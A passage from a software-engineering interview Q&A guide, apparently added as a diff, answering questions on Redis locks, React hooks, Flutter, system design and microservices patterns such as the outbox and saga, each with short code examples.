+**Answer:** `SET lock:key <unique-value> NX PX 30000` acquires the lock only if it doesn't exist, with an expiry so a crashed holder doesn't block forever. Release only if you still own it (compare value, using a Lua script for atomicity). Risks: if your work takes longer than the TTL, another process may acquire the lock; clock/GC pauses; a single Redis node failing. For critical correctness, also use **fencing tokens** or database-level constraints.
+
+**Example:**
+```ts
+const token = crypto.randomUUID();
+const ok = await redis.set('lock:daily-report', token, 'NX', 'PX', 30_000);
+if (ok) {
+  try { await generateReport(); }
+  finally {
+    await redis.eval(
+      `if redis.call("get", KEYS[1]) == ARGV[1] then return redis.call("del", KEYS[1]) else return 0 end`,
+      1, 'lock:daily-report', token
+    );
+  }
+}
+```
+
+### Q12. Are Redis commands atomic? What are MULTI/EXEC and Lua scripts?
+**Answer:** Each single command is atomic (single-threaded execution). For several commands as one unit, use `MULTI`/`EXEC` (queued and run together, no interleaving) or a **Lua script** (runs atomically and can contain logic). `WATCH` gives optimistic locking.
+
+### Q13. Redis Sentinel vs Redis Cluster?
+**Answer:** **Sentinel**: monitors a primary with replicas and performs automatic failover — high availability, but data still fits on one primary. **Cluster**: shards data across multiple primaries (16,384 hash slots), each with replicas — high availability **and** horizontal scaling of memory/throughput. Multi-key commands must hit the same slot (use hash tags `{user:42}:cart`).
+
+### Q14. What are the different layers of caching in a system?
+**Answer:** Browser cache (`Cache-Control`, `ETag`) → **CDN** (static assets, cacheable API responses at the edge) → reverse proxy/API gateway cache → **in-process memory** (fastest, but not shared across instances and lost on restart) → **distributed cache** (Redis, shared) → database's own buffer cache.
+
+**Example:** A product page: images from CDN, product JSON from Redis (5 min TTL), price/stock read fresh from DB at checkout.
+
+---
+
+## 11. React.js
+
+### Q1. What is React and what problem does it solve?
+**Answer:** React is a JavaScript library for building user interfaces from **components**. You describe what the UI should look like for a given **state**; when state changes, React re-renders and efficiently updates only the changed parts of the DOM. This makes complex, interactive UIs predictable and reusable.
+
+**Example:**
+```tsx
+function Greeting({ name }: { name: string }) {
+  return <h1>Hello, {name}!</h1>;
+}
+```
+
+### Q2. Props vs state?
+**Answer:** **Props** are inputs passed from parent to child; read-only inside the child. **State** is data owned by a component that changes over time; updating it triggers a re-render.
+
+**Example:**
+```tsx
+function Counter({ step }: { step: number }) {   // step = prop
+  const [count, setCount] = useState(0);          // count = state
+  return <button onClick={() => setCount(c => c + step)}>Count: {count}</button>;
+}
+<Counter step={5} />
+```
+
+### Q3. What is the virtual DOM and reconciliation?
+**Answer:** The virtual DOM is a lightweight JS representation of the UI. On a state change, React builds a new tree, **diffs** it with the previous one (reconciliation) and applies the minimum real DOM changes. Elements of different types are replaced; same types are updated; lists are matched by `key`.
+
+### Q4. Why do list items need a `key`? Why not use the index?
+**Answer:** Keys tell React which item is which between renders, so it can reuse DOM nodes and keep component state attached to the right item. Using the array index breaks when items are inserted, removed or reordered (state and input values attach to the wrong rows). Use a stable unique id.
+
+**Example:**
+```tsx
+// ❌
+{todos.map((t, i) => <TodoItem key={i} todo={t} />)}
+// ✅
+{todos.map(t => <TodoItem key={t.id} todo={t} />)}
+```
+
+### Q5. What causes a component to re-render?
+**Answer:** (1) Its state changes, (2) its parent re-renders (even if props are the same), (3) a context it uses changes. Re-rendering is usually cheap; optimise only when measured to be slow (React DevTools Profiler).
+
+### Q6. Explain `useEffect`, its dependency array and cleanup.
+**Answer:** `useEffect` runs side effects **after** render (fetching, subscriptions, timers, syncing with external systems).
+- No array → runs after every render.
+- `[]` → runs once after mount.
+- `[a, b]` → runs when `a` or `b` changes.
+- The returned function is the **cleanup**: runs before the next effect and on unmount.
+
+**Example:**
+```tsx
+function ChatRoom({ roomId }: { roomId: string }) {
+  useEffect(() => {
+    const socket = connect(roomId);
+    socket.on('message', addMessage);
+    return () => socket.disconnect();   // cleanup when roomId changes or unmount
+  }, [roomId]);
+  return <Messages />;
+}
+```
+
+### Q7. How do you fetch data correctly in a component?
+**Answer:** Handle loading and error states, and cancel stale requests (if `userId` changes quickly, an old response could overwrite the new one). In real projects prefer **TanStack Query** or SWR, which handle caching, retries, deduplication and refetching.
+
+**Example (manual):**
+```tsx
+function Orders({ userId }: { userId: string }) {
+  const [state, setState] = useState<{ loading: boolean; data?: Order[]; error?: string }>({ loading: true });
+
+  useEffect(() => {
+    const ctrl = new AbortController();
+    setState({ loading: true });
+    fetch(`/api/users/${userId}/orders`, { signal: ctrl.signal })
+      .then(r => (r.ok ? r.json() : Promise.reject(new Error(r.statusText))))
+      .then(data => setState({ loading: false, data }))
+      .catch(e => { if (e.name !== 'AbortError') setState({ loading: false, error: e.message }); });
+    return () => ctrl.abort();
+  }, [userId]);
+
+  if (state.loading) return <Spinner />;
+  if (state.error) return <p>Error: {state.error}</p>;
+  return <ul>{state.data!.map(o => <li key={o.id}>{o.total}</li>)}</ul>;
+}
+```
+
+**Example (TanStack Query):**
+```tsx
+const { data, isLoading, error } = useQuery({
+  queryKey: ['orders', userId],
+  queryFn: () => api.get(`/users/${userId}/orders`).then(r => r.data),
+  staleTime: 60_000,
+});
+
+const queryClient = useQueryClient();
+const cancel = useMutation({
+  mutationFn: (id: string) => api.post(`/orders/${id}/cancel`),
+  onSuccess: () => queryClient.invalidateQueries({ queryKey: ['orders', userId] }),
+});
+```
+
+### Q8. `useMemo` vs `useCallback` vs `React.memo`?
+**Answer:**
+- `useMemo(fn, deps)`: caches a **computed value**.
+- `useCallback(fn, deps)`: caches a **function reference** (so children don't see a "new" function each render).
+- `React.memo(Component)`: skips re-rendering a component if its props are shallowly equal.
+
+They work together: `React.memo` on a child is useless if the parent passes a new callback every render — wrap the callback in `useCallback`.
+
+**Example:**
+```tsx
+const filtered = useMemo(() => products.filter(p => p.price < maxPrice), [products, maxPrice]);
+const handleSelect = useCallback((id: string) => setSelected(id), []);
+const ProductRow = React.memo(function ProductRow({ p, onSelect }: Props) { /* ... */ });
+```
+
+### Q9. What is `useRef` used for?
+**Answer:** (1) Accessing a DOM element (focus, scroll, measure). (2) Storing a mutable value that persists across renders **without causing a re-render** (timer ids, previous values).
+
+**Example:**
+```tsx
+function SearchBox() {
+  const inputRef = useRef<HTMLInputElement>(null);
+  useEffect(() => inputRef.current?.focus(), []);
+  return <input ref={inputRef} />;
+}
+```
+
+### Q10. What are the rules of hooks? What is a custom hook?
+**Answer:** Call hooks only at the **top level** (not inside loops, conditions or nested functions) and only from React components or custom hooks — React relies on call order. A **custom hook** is a function starting with `use` that combines hooks to share logic.
+
+**Example:**
+```tsx
+function useDebounce<T>(value: T, delay = 300): T {
+  const [debounced, setDebounced] = useState(value);
+  useEffect(() => {
+    const t = setTimeout(() => setDebounced(value), delay);
+    return () => clearTimeout(t);
+  }, [value, delay]);
+  return debounced;
+}
+
+// Usage: only search after the user stops typing
+const debouncedQuery = useDebounce(query, 400);
+useEffect(() => { if (debouncedQuery) search(debouncedQuery); }, [debouncedQuery]);
+```
+
+### Q11. Controlled vs uncontrolled components?
+**Answer:** **Controlled**: React state is the single source of truth (`value` + `onChange`) — easy validation and dynamic behaviour. **Uncontrolled**: the DOM holds the value, read via `ref` — less code, used by libraries like React Hook Form for performance.
+
+**Example:**
+```tsx
+// Controlled
+const [email, setEmail] = useState('');
+<input value={email} onChange={e => setEmail(e.target.value)} />
+
+// Uncontrolled with React Hook Form + Zod
+const { register, handleSubmit, formState: { errors } } = useForm({ resolver: zodResolver(LoginSchema) });
+<form onSubmit={handleSubmit(onLogin)}>
+  <input {...register('email')} />
+  {errors.email && <span>{errors.email.message}</span>}
+</form>
+```
+
+### Q12. How do you share state? What is prop drilling and Context?
+**Answer:** **Lift state up** to the nearest common parent. Passing props through many layers that don't use them is **prop drilling**. **Context** provides a value to any descendant (good for theme, auth user, locale). For frequently changing global state, use Zustand or Redux Toolkit; for server data, TanStack Query.
+
+**Example:**
+```tsx
+const AuthContext = createContext<{ user: User | null; logout: () => void } | null>(null);
+
+export function AuthProvider({ children }: { children: React.ReactNode }) {
+  const [user, setUser] = useState<User | null>(null);
+  const logout = () => { api.post('/auth/logout'); setUser(null); };
+  return <AuthContext.Provider value={{ user, logout }}>{children}</AuthContext.Provider>;
+}
+
+export const useAuth = () => {
+  const ctx = useContext(AuthContext);
+  if (!ctx) throw new Error('useAuth must be used inside AuthProvider');
+  return ctx;
+};
+```
+
+### Q13. How do you create protected routes?
+**Answer:** Check auth (and role) before rendering; redirect to login if not allowed. The backend must still enforce authorization — frontend checks are for UX only.
+
+**Example (React Router v6):**
+```tsx
+function ProtectedRoute({ role }: { role?: string }) {
+  const { user } = useAuth();
+  if (!user) return <Navigate to="/login" replace />;
+  if (role && user.role !== role) return <Navigate to="/403" replace />;
+  return <Outlet />;
+}
+
+<Routes>
+  <Route path="/login" element={<Login />} />
+  <Route element={<ProtectedRoute />}>
+    <Route path="/orders" element={<Orders />} />
+  </Route>
+  <Route element={<ProtectedRoute role="admin" />}>
+    <Route path="/admin" element={<AdminDashboard />} />
+  </Route>
+</Routes>
+```
+
+### Q14. How do you handle an expired access token in the frontend?
+**Answer:** Use an HTTP interceptor: on `401`, call `/auth/refresh` once (refresh token is in an HttpOnly cookie), store the new access token, and retry the original request. If refresh fails, log the user out.
+
+**Example (axios):**
+```ts
+api.interceptors.response.use(undefined, async (error) => {
+  const original = error.config;
+  if (error.response?.status === 401 && !original._retry) {
+    original._retry = true;
+    const { data } = await axios.post('/v1/auth/refresh', {}, { withCredentials: true });
+    setAccessToken(data.accessToken);
+    original.headers.Authorization = `Bearer ${data.accessToken}`;
+    return api(original);
+  }
+  return Promise.reject(error);
+});
+```
+
+### Q15. How do you improve React performance?
+**Answer:** Measure first (Profiler). Then: memoize expensive components/values, avoid creating new objects/functions in props unnecessarily, **code-split** routes with `React.lazy` + `Suspense`, **virtualize** long lists (react-window), debounce inputs, keep state as local as possible, use proper keys, and optimise images.
+
+**Example:**
+```tsx
+const AdminDashboard = React.lazy(() => import('./AdminDashboard'));
+<Suspense fallback={<Spinner />}>
+  <AdminDashboard />
+</Suspense>
+```
+
+### Q16. CSR vs SSR vs SSG? What does Next.js add?
+**Answer:**
+- **CSR** (client-side rendering): browser downloads JS and renders — simple, slower first paint, weaker SEO.
+- **SSR** (server-side): server renders HTML per request — fast first paint, good SEO, more server load.
+- **SSG** (static generation): HTML built at build time — fastest, for content that rarely changes.
+
+Next.js is a React framework offering SSR, SSG, file-based routing, API routes and React Server Components.
+
+### Q17. How do you test React components?
+**Answer:** Use **React Testing Library** with Vitest/Jest, testing behaviour the user sees (text, roles, clicks) rather than internal state. Mock network calls with MSW.
+
+**Example:**
+```tsx
+test('shows error for invalid email', async () => {
+  render(<LoginForm />);
+  await userEvent.type(screen.getByLabelText(/email/i), 'not-an-email');
+  await userEvent.click(screen.getByRole('button', { name: /log in/i }));
+  expect(await screen.findByText(/valid email/i)).toBeInTheDocument();
+});
+```
+
+### Q18. Is React safe from XSS?
+**Answer:** React escapes values in JSX by default, so `{userInput}` is safe. Risk returns with `dangerouslySetInnerHTML`, `href={userInput}` (`javascript:` URLs), and third-party scripts. Sanitize HTML with DOMPurify if you must render it.
+
+**Example:**
+```tsx
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.html) }} />
+```
+
+---
+
+## 12. Flutter Basics
+
+### Q1. What is Flutter?
+**Answer:** Google's UI toolkit for building natively compiled apps for Android, iOS, web and desktop from **one Dart codebase**. It draws its own widgets with its rendering engine, so the UI looks the same on all platforms. Hot reload makes development fast.
+
+### Q2. StatelessWidget vs StatefulWidget?
+**Answer:** **StatelessWidget**: no mutable state; rebuilds only when its inputs change. **StatefulWidget**: has a `State` object; calling `setState()` rebuilds it.
+
+**Example:**
+```dart
+class Counter extends StatefulWidget {
+  const Counter({super.key});
+  @override
+  State<Counter> createState() => _CounterState();
+}
+
+class _CounterState extends State<Counter> {
+  int count = 0;
+  @override
+  Widget build(BuildContext context) {
+    return ElevatedButton(
+      onPressed: () => setState(() => count++),
+      child: Text('Count: $count'),
+    );
+  }
+}
+```
+
+### Q3. How do you call an API in Flutter?
+**Answer:** Use `http` or `dio` with `async/await`, parse JSON into model classes, and show results with `FutureBuilder` (or state management).
+
+**Example:**
+```dart
+class Order {
+  final int id;
+  final double total;
+  Order({required this.id, required this.total});
+  factory Order.fromJson(Map<String, dynamic> j) => Order(id: j['id'], total: (j['total'] as num).toDouble());
+}
+
+Future<List<Order>> fetchOrders(String token) async {
+  final res = await http.get(Uri.parse('https://api.shop.com/v1/orders'),
+      headers: {'Authorization': 'Bearer $token'});
+  if (res.statusCode != 200) throw Exception('Failed: ${res.statusCode}');
+  return (jsonDecode(res.body) as List).map((e) => Order.fromJson(e)).toList();
+}
+
+FutureBuilder<List<Order>>(
+  future: fetchOrders(token),
+  builder: (context, snap) {
+    if (snap.connectionState != ConnectionState.done) return const CircularProgressIndicator();
+    if (snap.hasError) return Text('Error: ${snap.error}');
+    return ListView(children: snap.data!.map((o) => ListTile(title: Text('₹${o.total}'))).toList());
+  },
+);
+```
+
+### Q4. What state management options exist in Flutter?
+**Answer:** `setState` (local), **Provider** (simple dependency injection + change notification), **Riverpod** (safer, testable successor of Provider), **Bloc/Cubit** (event → state streams, very structured), GetX. Pick Riverpod or Bloc for larger apps.
+
+### Q5. Which layout widgets should you know?
+**Answer:** `Container`, `Row`, `Column`, `Stack`, `Expanded`, `Flexible`, `Padding`, `SizedBox`, `ListView` (`.builder` for long lists), `GridView`, `Scaffold`, `AppBar`. Rows and columns are like CSS flexbox.
+
+---
+
+## 13. System Design
+
+### Q1. How do you approach a system design interview?
+**Answer:** Follow a structure (about 45 minutes):
+1. **Clarify requirements** — functional (features) and non-functional (scale, latency, availability, consistency). Ask questions.
+2. **Estimate** — users, requests per second, storage, bandwidth.
+3. **API design** — key endpoints.
+4. **Data model** — entities, SQL vs NoSQL, indexes.
+5. **High-level design** — draw boxes: clients, load balancer, services, cache, DB, queue, workers, CDN.
+6. **Deep dive** — the hardest component(s).
+7. **Bottlenecks, failures, trade-offs** — what breaks and how you'd handle it; what you'd improve with more time.
+
+### Q2. How do you do back-of-the-envelope estimates?
+**Answer:** Use round numbers. 1 day ≈ 86,400 s ≈ 10⁵ s.
+
+**Example:** 10 million daily active users, each makes 20 requests/day:
+- 200M requests/day ÷ 10⁵ s ≈ **2,000 requests/s average**, peak ~3x ≈ **6,000 req/s**.
+- If 10% are writes of 1 KB: 20M × 1 KB = **20 GB/day** → ~7 TB/year.
+- Read:write ratio 9:1 → read-heavy → caching and read replicas help.
+
+Useful latency numbers: memory read ~100 ns, SSD random read ~100 µs, network round trip in the same datacenter ~0.5 ms, cross-continent ~150 ms.
+
+### Q3. Vertical vs horizontal scaling?
+**Answer:** **Vertical** (scale up): bigger machine — simple, no code change, but has a hardware limit and a single point of failure. **Horizontal** (scale out): more machines behind a load balancer — near-unlimited and fault-tolerant, but requires **stateless** services and adds complexity (distributed data, consistency).
+
+### Q4. What does it mean for a service to be stateless and why does it matter?
+**Answer:** A stateless service keeps no client-specific data in its memory between requests. Session data, uploads and caches live in shared stores (Redis, DB, S3) or in the token. Then any instance can serve any request, so you can add/remove instances freely and survive crashes.
+
+**Example:** ❌ storing a user's cart in a JS object on server A (lost if the next request goes to server B). ✅ storing it in Redis `cart:42`.
+
+### Q5. What is a load balancer? Which algorithms are used?
+**Answer:** Distributes traffic across instances, runs **health checks** to remove unhealthy ones, and often terminates TLS. Algorithms: **round robin**, **weighted round robin**, **least connections**, **IP hash** (same client → same server), **consistent hashing**. **L4** balancers route by IP/port (TCP); **L7** balancers understand HTTP and can route by path, headers or cookies.
+
+**Example (NGINX):**
+```nginx
+upstream api {
+  least_conn;
+  server 10.0.0.1:3000;
+  server 10.0.0.2:3000;
+  server 10.0.0.3:3000;
+}
+server {
+  listen 443 ssl;
+  location /api/ { proxy_pass http://api; }
+}
+```
+
+### Q6. What is consistent hashing?
+**Answer:** A technique to distribute keys across servers so that adding or removing a server moves only a small fraction of keys (instead of nearly all, as with `hash(key) % N`). Servers and keys are placed on a hash ring; each key goes to the next server clockwise. **Virtual nodes** balance the load. Used in distributed caches, Cassandra, DynamoDB, and sharding.
+
+### Q7. How would you scale an API from 1,000 to 1 million users?
+**Answer:** Step by step, driven by measurements:
+1. Single server + DB → add **monitoring** to find bottlenecks.
+2. Optimise queries and add indexes; add **connection pooling**.
+3. Separate DB onto its own server; put **static assets on a CDN**.
+4. Make the app **stateless**; run multiple instances behind a **load balancer**; autoscale.
+5. Add **Redis caching** for hot reads.
+6. Move slow work to **queues and background workers**.
+7. **Read replicas** for read-heavy traffic.
+8. **Rate limiting** to protect the system.
+9. Partition / **shard** the DB, or split into services where domains need independent scaling.
+10. Multi-AZ / multi-region for availability.
+
+### Q8. Where would you add caching in a design, and what are the risks?
+**Answer:** At the CDN (static/edge), API responses for public data, Redis for hot entities and computed results, in-process for config. Risks: stale data, invalidation bugs, stampedes, extra memory cost, and more complexity. Always define a TTL and an invalidation strategy.
+
+### Q9. Why use asynchronous processing? Give an example.
+**Answer:** Some work is slow or unreliable (emails, PDFs, image processing, third-party calls, report generation). Doing it inside the request makes users wait and fails if the dependency fails. Instead: save the request, push a job to a **queue**, return quickly (`202 Accepted` or `201`), and let **workers** process it with retries. Queues also absorb traffic spikes.
+
+**Example:**
+```ts
+// API: respond fast
+app.post('/v1/reports', requireAuth, async (req, res) => {
+  const job = await reportQueue.add('monthly-sales', { userId: req.user.id, month: req.body.month },
+    { attempts: 5, backoff: { type: 'exponential', delay: 2000 } });
+  res.status(202).json({ jobId: job.id, statusUrl: `/v1/reports/${job.id}` });
+});
+
+// Worker: separate process
+new Worker('reports', async (job) => {
+  const file = await buildSalesReport(job.data);
+  await s3.upload(file);
+  await notifyUser(job.data.userId, file.url);
+}, { connection: redis, concurrency: 5 });
+```
+
+### Q10. What is a timeout and why must every network call have one?
+**Answer:** Without a timeout, a slow dependency makes your requests hang, holding connections, memory and threads until your whole service is exhausted (cascading failure). Set timeouts shorter than your own caller's timeout.
+
+**Example:**
+```ts
+const res = await fetch(url, { signal: AbortSignal.timeout(3000) });
+```
+
+### Q11. How should retries be done safely?
+**Answer:** Retry only **transient** errors (timeouts, 429, 503) and only **idempotent** operations (or with an idempotency key). Use **exponential backoff with jitter** so clients don't retry in sync (thundering herd). Limit attempts and total time. Avoid retrying at every layer (retries multiply).
+
+### Q12. What is a circuit breaker?
+**Answer:** A pattern that stops calling a failing dependency for a while so your system fails fast instead of piling up waiting requests.
+- **Closed**: calls go through; failures are counted.
+- **Open**: after the failure threshold, calls fail immediately (or use a fallback) for a cool-down period.
+- **Half-open**: a few trial calls; if they succeed → closed, else → open again.
+
+**Example (opossum in Node):**
+```ts
+import CircuitBreaker from 'opossum';
+const breaker = new CircuitBreaker(callPaymentProvider, {
+  timeout: 3000,
+  errorThresholdPercentage: 50,
+  resetTimeout: 30_000,
+});
+breaker.fallback(() => ({ status: 'pending', message: 'Payment provider busy, we will retry' }));
+const result = await breaker.fire(orderId);
+```
+
+### Q13. What other failure-handling patterns should you know?
+**Answer:**
+- **Bulkhead**: isolate resources (separate connection pools/thread pools per dependency) so one slow dependency can't consume everything.
+- **Graceful degradation / fallback**: show cached or partial data (e.g. hide recommendations if that service is down).
+- **Dead-letter queue**: messages that keep failing go aside for inspection instead of blocking the queue.
+- **Load shedding**: reject low-priority traffic when overloaded.
+- **Health checks + autoscaling + multi-AZ** redundancy.
+- **Idempotency** everywhere retries happen.
+- **Backups** with tested restores; defined RPO (how much data you can lose) and RTO (how fast you recover).
+
+### Q14. What does 99.9% vs 99.99% availability mean?
+**Answer:**
+| Availability | Downtime per year | Per month |
+|---|---|---|
+| 99% | 3.65 days | 7.3 h |
+| 99.9% | 8.76 h | 43.8 min |
+| 99.99% | 52.6 min | 4.4 min |
+| 99.999% | 5.3 min | 26 s |
+
+If two services each have 99.9% and both are required, the combined availability is ~99.8%. Redundancy improves availability; serial dependencies reduce it.
+
+### Q15. Strong vs eventual consistency?
+**Answer:** **Strong**: after a write, every read returns that write (single primary DB). **Eventual**: replicas converge over time; reads may be briefly stale (read replicas, caches, DNS, many NoSQL stores). **Read-your-writes**: a user always sees their own changes (read from primary after writing, or use session stickiness).
+
+**Example:** After a user updates their profile photo, read from the primary for that user for a few seconds, while other users may see the old photo briefly from replicas/cache.
+
+### Q16. Design a URL shortener.
+**Answer:**
+- **Requirements**: create short URL, redirect, optional expiry, click analytics. Read-heavy (100:1).
+- **Estimate**: 100M new URLs/month ≈ 40 writes/s; reads ≈ 4,000/s.
+- **API**: `POST /v1/urls {longUrl}` → `{shortCode}`; `GET /{code}` → `301/302` redirect.
+- **Code generation**: base62 of an auto-increment id or a distributed id (Snowflake); 7 chars of base62 = 62⁷ ≈ 3.5 trillion codes. Or random + uniqueness check.
+- **Storage**: `urls(code PK, long_url, user_id, created_at, expires_at)` — key-value access pattern fits DynamoDB/Cassandra or Postgres.
+- **Read path**: CDN/Redis cache `code → long_url` (hot links), fallback DB.
+- **Analytics**: publish click events to a queue/Kafka → aggregate asynchronously (never slow the redirect).
+- **Trade-offs**: 301 (cached by browser, fewer analytics) vs 302 (every click hits us).
+
+### Q17. Design a notification service (email, SMS, push).
+**Answer:**
+- Producers (order service, auth service) publish `NotificationRequested` events or call `POST /notifications`.
+- Notification service checks **user preferences** and templates, then puts a job on a **per-channel queue** (email, sms, push).
+- Channel **workers** call providers (SES, Twilio, FCM) with **retries + backoff**, **rate limits** per provider, and failover to a backup provider.
+- **Idempotency key** per notification to avoid duplicates; **dead-letter queue** for permanent failures.
+- Store status (`queued → sent → delivered/failed`) for tracking; webhooks from providers update delivery status.
+- Priorities: OTPs on a high-priority queue, marketing on a low-priority one.
+
+### Q18. Design a chat application.
+**Answer:**
+- **Real-time**: clients keep a **WebSocket** connection to chat servers.
+- **Message flow**: sender → chat server → store message (Cassandra/Mongo/Postgres, partitioned by conversation id) → publish via **Redis Pub/Sub or Kafka** → the server holding the recipient's connection pushes it.
+- **Connection registry**: Redis map `userId → serverId`.
+- **Offline users**: push notification + fetch history on reconnect (cursor pagination by message id/time).
+- **Ordering**: per-conversation sequence numbers.
+- **Delivery/read receipts** and **presence** (heartbeats with TTL keys).
+- **Scaling**: stateless chat servers behind an L7 balancer with sticky sessions; horizontal scale by connection count.
+
+### Q19. Design a rate limiter.
+**Answer:** Where: API gateway or middleware. Algorithm: **token bucket** (allows bursts) or **sliding window counter**. Store counters in **Redis** so all instances share them; use Lua scripts for atomic check-and-update. Key by user id / API key / IP. Return `429` with `Retry-After` and `X-RateLimit-*` headers. Decide fail-open vs fail-closed if Redis is down. Different limits per plan or endpoint (stricter on login/OTP).
+
+### Q20. Design an e-commerce checkout.
+**Answer:**
+1. Cart in Redis/DB.
+2. Checkout: validate prices server-side; **reserve stock** (atomic `UPDATE ... WHERE stock >= qty` or reservation rows with expiry).
+3. Create order `pending_payment` (with **idempotency key**).
+4. Redirect to payment provider; receive result via **webhook** (verify signature, deduplicate).
+5. On success → order `paid`, publish `OrderPaid` event → inventory confirm, invoice, email, shipping (async consumers).
+6. On failure/timeout → release reservation (**saga compensation**); a scheduled job cleans expired reservations.
+7. Use the **outbox pattern** so DB update and event publish never get out of sync.
+
+### Q21. Fan-out on write vs fan-out on read (news feed)?
+**Answer:** **Fan-out on write (push)**: when a user posts, write the post id into every follower's feed list — reads are very fast, writes expensive for celebrities with millions of followers. **Fan-out on read (pull)**: build the feed at read time from followed users' posts — cheap writes, slow reads. **Hybrid**: push for normal users, pull for celebrities, merge at read time.
+
+### Q22. How would you design file uploads?
+**Answer:** Don't stream big files through your API servers. The API returns a **pre-signed URL**; the client uploads directly to object storage (S3); S3 triggers an event (or the client confirms) → a worker scans/resizes/processes the file; metadata is saved in the DB; files are served via CDN. Validate size and content type, and scan for malware.
+
+**Example:**
+```ts
+const url = await getSignedUrl(s3, new PutObjectCommand({
+  Bucket: 'uploads', Key: `users/${userId}/${crypto.randomUUID()}.jpg`, ContentType: 'image/jpeg',
+}), { expiresIn: 300 });
+res.json({ uploadUrl: url });
+```
+
+---
+
+## 14. Microservices, Queues, Event-Driven, WebSockets, API Gateway, Serverless
+
+### Q1. Monolith vs microservices — pros and cons?
+**Answer:**
+| | Monolith | Microservices |
+|---|---|---|
+| Deployment | One unit | Each service independently |
+| Development | Simple, easy local setup | Teams work independently |
+| Data | One DB, easy joins/transactions | DB per service; no cross-service joins/transactions |
+| Scaling | Whole app together | Each service separately |
+| Failures | One bug may crash everything | Isolated, but network/partial failures are common |
+| Ops | Simple | Complex: discovery, tracing, many pipelines |
+
+Start with a **modular monolith**; extract services when there's a real reason: independent scaling, team ownership, different release cycles, or different technology needs.
+
+### Q2. How do you decide service boundaries?
+**Answer:** Split by **business capability / bounded context** (Domain-Driven Design): Orders, Payments, Inventory, Notifications, Users. Each service owns its data and exposes an API/events. Avoid splitting by technical layer ("database service"), and avoid "chatty" services that must call each other constantly (a sign the boundary is wrong).
+
+### Q3. Synchronous vs asynchronous communication between services?
+**Answer:** **Synchronous** (REST/gRPC): simple request-response, immediate result, but **temporal coupling** — if Inventory is down, Order fails; latency adds up through chains. **Asynchronous** (events/messages via a broker): services are decoupled and resilient to downtime, can absorb spikes, but are **eventually consistent** and harder to debug.
+
+**Example:** Checking stock before showing "Buy" → sync gRPC call. Sending a confirmation email after payment → async event.
+
+### Q4. What is a message queue vs pub/sub?
+**Answer:** **Queue (point-to-point)**: each message is processed by **one** consumer (work distribution — e.g. image resize jobs spread over 10 workers). **Pub/Sub**: each message goes to **every subscriber** (e.g. `OrderPaid` goes to inventory, email and analytics).
+
+### Q5. RabbitMQ vs Kafka vs SQS?
+**Answer:**
+| | RabbitMQ | Kafka | AWS SQS |
+|---|---|---|---|
+| Model | Message broker (exchanges → queues) | Distributed append-only log (topics, partitions) | Managed queue |
+| Message after consume | Deleted after ack | Kept (retention), can **replay** | Deleted after processing |
+| Throughput | High | Very high (millions/s) | High, managed |
+| Ordering | Per queue | Per partition | FIFO queues |
+| Best for | Task queues, complex routing | Event streaming, analytics, event sourcing, many consumers | Simple decoupling on AWS without ops |
+
+### Q6. What are delivery guarantees?
+**Answer:**
+- **At-most-once**: may lose messages, never duplicates.
+- **At-least-once**: never loses, may **duplicate** (most common).
+- **Exactly-once**: very hard end to end; in practice achieved as **at-least-once + idempotent consumers**.
+
+**Example (idempotent consumer):**
+```ts
+consumer.on('message', async (msg) => {
+  const inserted = await db.query(
+    'INSERT INTO processed_messages (id) VALUES ($1) ON CONFLICT DO NOTHING', [msg.id]);
+  if (inserted.rowCount === 0) return msg.ack();     // duplicate, skip
+  await handleOrderPaid(msg.payload);
+  msg.ack();
+});
+```
+
+### Q7. Explain Kafka topics, partitions and consumer groups.
+**Answer:** A **topic** is a named stream of events, split into **partitions** (ordered logs) for parallelism. Messages with the same **key** go to the same partition, so they stay ordered (e.g. key = `orderId`). A **consumer group** shares the partitions — each partition is read by one consumer in the group; add consumers (up to the partition count) to scale. Each consumer tracks its **offset**; **consumer lag** shows how far behind it is.
+
+**Example (kafkajs):**
+```ts
+await producer.send({
+  topic: 'orders',
+  messages: [{ key: String(order.id), value: JSON.stringify({ type: 'OrderPaid', order }) }],
+});
+
+const consumer = kafka.consumer({ groupId: 'inventory-service' });
+await consumer.subscribe({ topic: 'orders' });
+await consumer.run({
+  eachMessage: async ({ message }) => {
+    const event = JSON.parse(message.value!.toString());
+    if (event.type === 'OrderPaid') await inventory.confirm(event.order);
+  },
+});
+```
+
+### Q8. What is a dead-letter queue?
+**Answer:** A separate queue where messages go after they fail processing a set number of times (a "poison message"). This stops one bad message from blocking the queue forever and lets engineers inspect and replay it later. Alert when the DLQ grows.
+
+### Q9. Event vs command? What is event-driven architecture?
+**Answer:** An **event** states a fact that already happened (`OrderPlaced`, past tense) — the publisher doesn't know who listens. A **command** asks a specific service to do something (`SendInvoice`). In **event-driven architecture**, services react to events, which keeps them loosely coupled and makes adding new consumers easy (add analytics without touching the order service).
+
+**Example event:**
+```json
+{
+  "eventId": "evt_8f2c",
+  "type": "OrderPlaced",
+  "version": 1,
+  "occurredAt": "2026-10-07T10:15:00Z",
+  "data": { "orderId": 981, "userId": 42, "total": 340 }
+}
+```
+
+### Q10. What is the Transactional Outbox pattern?
+**Answer:** Problem: you save an order to the DB and then publish an event; if the publish fails (or the app crashes in between), the DB and other services disagree. Solution: in the **same DB transaction**, insert the order **and** a row in an `outbox` table. A separate relay process (polling or Change Data Capture with Debezium) reads unsent outbox rows, publishes them to the broker, and marks them sent. Consumers must be idempotent (at-least-once).
+
+**Example:**
+```sql
+BEGIN;
+INSERT INTO orders (id, user_id, total, status) VALUES (981, 42, 340, 'paid');
+INSERT INTO outbox (id, aggregate_id, type, payload)
+VALUES (gen_random_uuid(), 981, 'OrderPaid', '{"orderId":981,"total":340}');
+COMMIT;
+```
+```ts
+// relay, runs every second
+const { rows } = await db.query(
+  'SELECT * FROM outbox WHERE sent_at IS NULL ORDER BY created_at LIMIT 100 FOR UPDATE SKIP LOCKED');
+for (const row of rows) {
+  await broker.publish(row.type, row.payload);
+  await db.query('UPDATE outbox SET sent_at = now() WHERE id = $1', [row.id]);
+}
+```
+
+### Q11. What is the Saga pattern?
+**Answer:** A way to handle a business transaction across several services without a distributed lock/2PC. It's a sequence of **local transactions**; if one step fails, previous steps are undone by **compensating actions**.
+- **Choreography**: each service listens to events and reacts (no central controller) — simple for few steps, hard to follow for many.
+- **Orchestration**: a central orchestrator tells each service what to do and handles failures — clearer for complex flows (tools: Temporal, AWS Step Functions).
+
+**Example (order saga):**
+```
+1. Order Service:     create order (PENDING)
+2. Inventory Service: reserve stock        ── fails? → cancel order
+3. Payment Service:   charge customer      ── fails? → release stock → cancel order
+4. Order Service:     mark CONFIRMED
+5. Shipping Service:  create shipment
+```
+
